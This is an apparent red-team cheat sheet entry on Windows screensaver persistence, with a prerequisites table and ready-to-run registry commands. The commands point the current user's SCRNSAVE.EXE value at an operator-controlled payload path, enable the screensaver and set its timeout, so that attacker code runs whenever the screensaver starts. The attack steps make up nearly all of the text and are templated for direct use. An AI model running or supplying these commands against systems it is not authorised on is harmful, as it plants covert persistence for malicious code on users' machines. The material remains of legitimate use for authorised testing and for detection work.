---
technique: Screensaver Persistence
category: persistence
targets: Windows User Profiles
protocols: Local
remote_capable: false
tags: windows persistence screensaver registry
---

# Screensaver Persistence

Screensaver persistence sets a user screensaver path to an operator-controlled executable that runs when the screensaver triggers.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| User registry access | HKCU persistence affects the current user |
| Interactive session | Screensaver execution requires an interactive desktop |
| Payload path | The configured executable must remain reachable |

## Windows

### Query screensaver

#cmd #registry #screensaver

Query current user screensaver settings.

```cmd title:"Query screensaver settings"
reg query "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE
```
<!-- cheat -->

### Step 1: Set screensaver executable

#cmd #registry #screensaver

Set the screensaver executable path.

```cmd title:"Set screensaver executable"
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "$payload_path" /f
```
<!-- cheat
var payload_path
-->

### Step 2: Enable screensaver

#cmd #registry #screensaver

Enable the screensaver for the current user.

```cmd title:"Enable screensaver"
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
```
<!-- cheat -->

### Step 3: Set screensaver timeout

#cmd #registry #screensaver

Set the screensaver timeout in seconds.

```cmd title:"Set screensaver timeout"
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "$timeout_seconds" /f
```
<!-- cheat
var timeout_seconds
-->

## Linux

No Linux operator command is included here. This note covers Windows screensaver persistence.
